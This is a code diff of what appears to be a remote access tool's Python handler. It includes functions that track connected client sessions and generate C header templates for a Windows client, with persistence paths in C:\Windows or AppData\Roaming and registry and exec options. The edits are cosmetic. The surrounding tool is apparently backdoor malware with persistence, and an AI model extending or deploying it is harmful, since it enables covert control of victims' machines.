@@ -86,7 +86,7 @@ def areYouSure():
     #test the input is y or n and return True if yes else return False.
 
     inp = str(input("YesOrNo> ")).lower()
-    
+    print("\n")
     if(inp == "y" or inp == "yes"):
         return True
     
@@ -119,8 +119,6 @@ def pingAllTarget(dict_conn,checkconn_objt , number_of_times=int() ,ping_string=
         if(dict_conn[key][NB_ALIVE] ==True and dict_conn[key][NB_SOCKET] ==False):
             print("\n\n\nChange value Is he alive true to false.")
             dict_conn[key][NB_ALIVE] = False
-
-        #print("TEST SOCK--->",bool(Handler.dict_conn[key][NB_SOCKET]))
     
         if(dict_conn[key][NB_ALIVE] and bool(dict_conn[key][NB_SOCKET]) and not dict_conn[key][NB_SELECT]): #If the connection is alive (True) and the socket object is active (True)
             try:
@@ -128,8 +126,8 @@ def pingAllTarget(dict_conn,checkconn_objt , number_of_times=int() ,ping_string=
 
             except ConnectionError as connerr: #If the connection does not answer
                 if(Handler.status_connection_display):
-                    printColor("information","\n[-] Client number {} {}:{} was disconnected.".format(dict_conn[key][NB_SESSION], dict_conn[key][NB_IP], dict_conn[key][NB_PORT]))
-                    #printColor("error",str(connerr))
+                    printColor("information","[-] Client number {} {}:{} was disconnected.".format(dict_conn[key][NB_SESSION], dict_conn[key][NB_IP], dict_conn[key][NB_PORT]))
+
                 else:
                     pass
                 checkconn_objt.connexionIsDead(key) #Change status to dead (False)
@@ -172,9 +170,7 @@ def commonHeader():
 #define PATH_ADMIN "C:\\\\Windows" //Persistence path if the client is running admin mode.
 #define PATH_NOT_ADMIN "C:\\\\Users\\\\$USER\\\\AppData\\\\Roaming" // DO NOT TOUCH
 
-//0101101010101010100101101001010101010100101010100101011001010101010101100101101001010101
 // DO NOT TOUCH:
-
 #define TIMEOUT_CREATE_PROC  10000
 #define BUFFER_LEN 4096
 #define BUFFER_EXEC 1024 //Buffer for exec
@@ -187,10 +183,6 @@ def commonHeader():
 
 
 #endif
-
-/*
-$USER is changed by the user who executed the program.
-*/
 """
     return header
 
@@ -216,9 +208,8 @@ def customHeader(ip, auto, port, reco, name, registry, key):
 #define PATH_ADMIN "C:\\\\Windows" //Persistence path if the client is running admin mode.
 #define PATH_NOT_ADMIN "C:\\\\Users\\\\$USER\\\\AppData\\\\Roaming" // DO NOT TOUCH
 
-//0101101010101010100101101001010101010100101010100101011001010101010101100101101001010101
-// DO NOT TOUCH:
 
+// DO NOT TOUCH:
 #define TIMEOUT_CREATE_PROC 10000
 #define BUFFER_EXEC 1024 //Buffer for exec
 #define BUFFER_LEN 4096
